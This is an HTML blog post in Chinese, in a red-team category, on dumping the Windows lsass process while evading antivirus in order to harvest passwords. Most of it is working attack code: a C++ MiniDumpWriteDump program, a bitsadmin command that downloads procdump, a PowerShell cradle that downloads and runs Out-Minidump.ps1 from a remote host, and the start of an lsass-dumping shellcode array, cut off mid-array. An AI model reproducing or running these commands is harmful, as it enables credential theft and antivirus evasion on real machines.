@@ -1,0 +1,1431 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="“那时候，好像永远是夏天，太阳总是有空出来伴随着我，阳光充足，太亮，使得眼前一阵阵发黑”  记录一些绕过杀软读取lsass进程的方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过杀软转存lsass进程">
+<meta property="og:url" content="https://lengjibo.github.io/lassdump/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="“那时候，好像永远是夏天，太阳总是有空出来伴随着我，阳光充足，太亮，使得眼前一阵阵发黑”  记录一些绕过杀软读取lsass进程的方法">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/lassdump/10.png">
+<meta property="og:updated_time" content="2020-03-17T02:14:07.616Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="绕过杀软转存lsass进程">
+<meta name="twitter:description" content="“那时候，好像永远是夏天，太阳总是有空出来伴随着我，阳光充足，太亮，使得眼前一阵阵发黑”  记录一些绕过杀软读取lsass进程的方法">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/lassdump/1.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/lassdump/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>绕过杀软转存lsass进程 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/lassdump/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">绕过杀软转存lsass进程
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-03-17 09:45:19 / Updated at: 10:14:07" itemprop="dateCreated datePublished" datetime="2020-03-17T09:45:19+08:00">2020-03-17</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>“那时候，好像永远是夏天，太阳总是有空出来伴随着我，阳光充足，太亮，使得眼前一阵阵发黑”</p>
+<hr>
+<p>记录一些绕过杀软读取lsass进程的方法</p>
+<a id="more"></a>
+<p>在后渗透中，我们常常会遇到密码抓取这个一个问题，当然，常见的方法就是使用mimikatz进行抓取，但是随着时代的变化，常规的技术已经不能满足我们的需求了，本文就将介绍一些不是很常见的技术来获取服务器密码。</p>
+<h2 id="lsass进程转存"><a href="#lsass进程转存" class="headerlink" title="lsass进程转存"></a>lsass进程转存</h2><h3 id="普通转存："><a href="#普通转存：" class="headerlink" title="普通转存："></a>普通转存：</h3><p>这个方法有很多，比如下面的代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment( lib, <span class="meta-string">"Dbghelp.lib"</span> )</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD lsassPID = <span class="number">0</span>;</span><br><span class="line">	HANDLE lsassHandle = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE outFile = CreateFile(<span class="string">L"lsass.dmp"</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">	processEntry.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	LPCWSTR processName = <span class="string">L""</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">		<span class="keyword">while</span> (_wcsicmp(processName, <span class="string">L"lsass.exe"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			Process32Next(snapshot, &amp;processEntry);</span><br><span class="line">			processName = processEntry.szExeFile;</span><br><span class="line">			lsassPID = processEntry.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		wcout &lt;&lt; <span class="string">"[+] Got lsass.exe PID: "</span> &lt;&lt; lsassPID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, lsassPID);</span><br><span class="line">	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (isDumped) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"[+] lsass dumped successfully!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译好的版本，可以访问(<a href="https://github.com/lengjibo/RedTeamTools/tree/master/windows/hashdump" target="_blank" rel="noopener">https://github.com/lengjibo/RedTeamTools/tree/master/windows/hashdump</a>)<br>技术原理也就是MiniDumpWriteDump这个API的作用。使用管理员权限运行会生成lsass.dmp，然后使用mimikatz加载即可。</p>
+<p><img src="../images/lassdump/1.png" alt="image"></p>
+<p>除了这个常见的还有的 prodump.exe：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cd c:\Windows\Temp </span><br><span class="line"># bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe c:\windows\temp\dump.exe </span><br><span class="line"># dump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+<p>powershell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/klionsec/CommonTools/master/Out-Minidump.ps1&apos;); Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp&quot; </span><br><span class="line"># tasklist | findstr /c:&quot;egui.exe&quot; /c:&quot;ekrn.exe&quot; </span><br><span class="line"># dir c:\windows\Temp | findstr &quot;lsass&quot;</span><br></pre></td></tr></table></figure>
+<p>Out-Minidump.ps1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\Tools\Out-Minidump.ps1&apos;; Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp&#125;&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="使用shellcode进行转存："><a href="#使用shellcode进行转存：" class="headerlink" title="使用shellcode进行转存："></a>使用shellcode进行转存：</h3><p>这个是国外一个大佬写出来的，直接使用shellcode进行转存，下面是win7下面的代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Shellcode to dump the lsass process</span></span><br><span class="line"><span class="comment"> * Tested on Windows 8 and 7. Doesn't work on Windows 10 and Windows Server 2019.</span></span><br><span class="line"><span class="comment"> * Arch: x86_64</span></span><br><span class="line"><span class="comment"> * Author: Osanda Malith Jayathissa (@OsandaMalith)</span></span><br><span class="line"><span class="comment"> * Website: https://osandamalith.com    </span></span><br><span class="line"><span class="comment"> * Date: 11/05/2019</span></span><br><span class="line"><span class="comment"> * Make sure the process running this shellcode has admin rights.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">822</span>] = &#123;</span><br><span class="line">        <span class="number">0xE9</span>, <span class="number">0x1B</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x74</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x10</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x8B</span>, <span class="number">0xF1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x18</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0x4D</span>, <span class="number">0x8B</span>, <span class="number">0x41</span>, <span class="number">0x30</span>, <span class="number">0x4D</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x84</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x49</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, <span class="number">0x3C</span>,</span><br><span class="line">        <span class="number">0x4D</span>, <span class="number">0x8B</span>, <span class="number">0x09</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0xD2</span>, <span class="number">0xF3</span>, <span class="number">0x0F</span>, <span class="number">0x7F</span>,</span><br><span class="line">        <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x85</span>, <span class="number">0xDB</span>, <span class="number">0x74</span>, <span class="number">0xD4</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0xC1</span>, <span class="number">0xE8</span>, <span class="number">0x10</span>, <span class="number">0x44</span>, <span class="number">0x0F</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xD0</span>, <span class="number">0x45</span>, <span class="number">0x85</span>, <span class="number">0xD2</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, <span class="number">0x8B</span>, <span class="number">0xDA</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0xCA</span>, <span class="number">0x0D</span>, <span class="number">0x80</span>, <span class="number">0x39</span>, <span class="number">0x61</span>, <span class="number">0x0F</span>, <span class="number">0xBE</span>, <span class="number">0x01</span>, <span class="number">0x7C</span>, <span class="number">0x03</span>, <span class="number">0x83</span>, <span class="number">0xC2</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x49</span>, <span class="number">0xFF</span>, <span class="number">0xCB</span>, <span class="number">0x75</span>, <span class="number">0xE8</span>, <span class="number">0x4D</span>, <span class="number">0x8D</span>, <span class="number">0x14</span>, <span class="number">0x18</span>, <span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x03</span>, <span class="number">0xF8</span>, <span class="number">0x41</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0x90</span>, <span class="number">0x8B</span>, <span class="number">0x1F</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xDB</span>, <span class="number">0x48</span>,</span><br><span class="line">        <span class="number">0x8D</span>, <span class="number">0x7F</span>, <span class="number">0x04</span>, <span class="number">0x49</span>, <span class="number">0x03</span>, <span class="number">0xD8</span>, <span class="number">0x41</span>, <span class="number">0xC1</span>, <span class="number">0xCB</span>, <span class="number">0x0D</span>, <span class="number">0x0F</span>, <span class="number">0xBE</span>, <span class="number">0x03</span>, <span class="number">0x48</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xD8</span>, <span class="number">0x80</span>, <span class="number">0x7B</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0xED</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>, <span class="number">0x13</span>, <span class="number">0x3B</span>, <span class="number">0xC6</span>, <span class="number">0x74</span>,</span><br><span class="line">        <span class="number">0x0D</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x41</span>, <span class="number">0x3B</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0xD1</span>, <span class="number">0xE9</span>, <span class="number">0x5C</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>,</span><br><span class="line">        <span class="number">0x42</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x49</span>, <span class="number">0x03</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0x4A</span>, <span class="number">0x1C</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0x48</span>, <span class="number">0x98</span>, <span class="number">0x49</span>, <span class="number">0x03</span>, <span class="number">0xC0</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x49</span>, <span class="number">0x03</span>, <span class="number">0xC0</span>, <span class="number">0xEB</span>, <span class="number">0x02</span>, <span class="number">0x33</span>,</span><br><span class="line">        <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>,</span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x40</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0xAC</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>, <span class="number">0xD8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0xA0</span>, <span class="number">0xB9</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF3</span>, <span class="number">0xAA</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xF6</span>,</span><br><span class="line">        <span class="number">0xB9</span>, <span class="number">0x4C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0x80</span>, <span class="number">0x6B</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6E</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0x84</span>, <span class="number">0x65</span>,</span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0x88</span>, <span class="number">0x2E</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0x75</span>, <span class="number">0x8C</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x2E</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span 